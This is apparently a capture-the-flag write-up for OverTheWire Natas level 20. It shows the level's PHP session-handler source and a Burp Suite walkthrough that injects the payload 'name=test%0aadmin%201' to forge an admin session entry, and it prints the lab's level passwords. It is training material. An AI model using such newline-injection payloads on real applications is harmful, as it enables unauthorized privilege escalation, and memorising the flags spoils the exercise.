# Natas Level 19 → Level 20 Logic Errors = Bug

## Previous Flag
<b>p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</b>

## Goal
Username: natas20<br>
URL: http://natas20.natas.labs.overthewire.org<br>

You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.<br>
Your name:<br>
Change Name<br>

| **Feature/Tool** | **Burp Suite** | **Wireshark** | **tcpflow** |
|------------------|----------------|----------------|-------------|
| **Main Purpose** | Web app security testing | General network traffic analysis | TCP stream capture and reconstruction |
| **Layer Focus** | Application Layer (HTTP/S) | Network/Data Link Layer (Packets, Protocols) | **Transport Layer (TCP streams)** |
| **Visibility** | Intercepts and modifies HTTP/S | Views all packets (Ethernet, TCP, DNS, etc.) | Reconstructs TCP flows into readable data |
| **Interception?** | **Yes (can modify live requests/responses)** | No (passive capture only) | No (passive capture only) |
| **Interface** | GUI (Professional-grade) | GUI (Packet-by-packet view) | Command-line tool |
| **Use Case** | Testing for XSS, SQLi, Auth Bypass, etc. | Troubleshooting networks, protocol analysis | Viewing raw TCP conversation logs |
| **TLS/HTTPS** | Decrypts HTTPS (via trusted proxy cert) | Can see TLS handshake but not decrypted data | Captures encrypted blobs (can’t decrypt HTTPS) |


## What I learned
```
Source code analysis and using Burp Suite

Note: Any time developers avoid using normal behavior of a function/library is an opportunity to find a bug
strspn()    only includes alphanumeric characters
ksort()     sorts the keys in ascending order
myread()    reads lines in using new line character as end of the line

Goal:       $_SESSION["admin"] = 1
Note: You can't inject raw payloads (like \n) directly in many browsers need use Burp Suite

Burp Suite:
    Proxy (Proxy → Intercept)
        Burp Suite acts as a man-in-the-middle proxy between your browser and internet
            View
            Modify
            Drop
            Forward
            ... that request before it reaches the server
    Repeater
        Manually modifying and re-sending individual HTTP requests
```

## Solution
```
View Source Code
http://natas20.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "<censored>" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 👀
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

<form action="index.php" method="POST">
Your name: <input name="name" value="<?=$name?>"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

F12 → Application
Storage → Cookies

Name        Value
PHPSESSID   <random> → o6h7gj6t9hcsd5g2oljn8nsj5k

http://natas20.natas.labs.overthewire.org/?debug
DEBUG: MYREAD o6h7gj6t9hcsd5g2oljn8nsj5k
DEBUG: Session file doesn't exist
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
Your name: 
Change name

DEBUG: MYWRITE o6h7gj6t9hcsd5g2oljn8nsj5k
DEBUG: Saving in /var/lib/php/sessions/mysess_o6h7gj6t9hcsd5g2oljn8nsj5k

# Goal: $_SESSION["admin"] = 1
# Can't inject to browser directly need Burp Suite: test\nadmin 1
# Burp Suite:   Temporary project in memory
                Use Burp defaults

# Burp Suite: Click Proxy and open Burp Browser and Turn Intercept: On
# Browser: input test and submit form so Burp Browser can capture
# Burp Suite: Right click request and select Send to Repeater

# Burp Suite: Click on Repeater and edit name to be URL Encoded then press SEND
    name=test%0aadmin%201

You are an admin. The credetials for the next level are
Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH 🔐
```
![alt text](/static/natas20SendToRepeater.png "BS Send To Repeater")
![alt text](/static/natas20Request.png "BS Request")
![alt text](/static/natas20Response.png "BS Response")

## Flag
<b>BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</b>

## Continue
[Continue](/overthewire/Natas2021.md)